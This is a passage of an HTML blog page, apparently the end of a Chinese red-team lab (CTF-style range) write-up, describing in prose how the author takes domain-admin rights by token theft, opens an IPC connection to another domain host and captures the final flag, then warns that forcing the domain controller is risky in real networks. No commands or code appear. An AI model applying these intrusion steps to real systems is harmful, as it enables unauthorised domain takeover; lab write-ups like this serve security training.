+<p>然后通过令牌窃取身份切换为域管：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3jm7e1.jpg"><br>然后通过和域机器 <code>10.10.10.209</code> 建立 <code>IPC</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/AUKzNo.jpg"><br>至此最后一个 <code>flag</code> 也拿到：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4p4HUP.jpg"><br>至此本次考核完毕！</p>
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>对于红队成员来说最重要的就是渗透不能有短板，各种漏洞都应该去复现一遍，由于我 <code>Exchange</code> 的漏洞未复现导致卡了很长时间，最后还是使用暴力的手段拿到域控，在真实环境中很危险，很有可能导致域控的密码恢复不了！哦豁，那你就等着跑路吧！</p>
+<h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><blockquote>
+<p>若有好的建议和合作可以通过公众号与我联系！</p>
+</blockquote>
+<p>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/qrcode_for_gh_c7af3a6c01f1_258.jpeg"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2021/06/09/redTeam-1/">http://example.com/2021/06/09/redTeam-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/redTeam/"># redTeam</a>
+                    
+                        <a href="/tags/%E9%9D%B6%E5%9C%BA/"># 靶场</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2021/06/05/hello-world/">Hello World</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
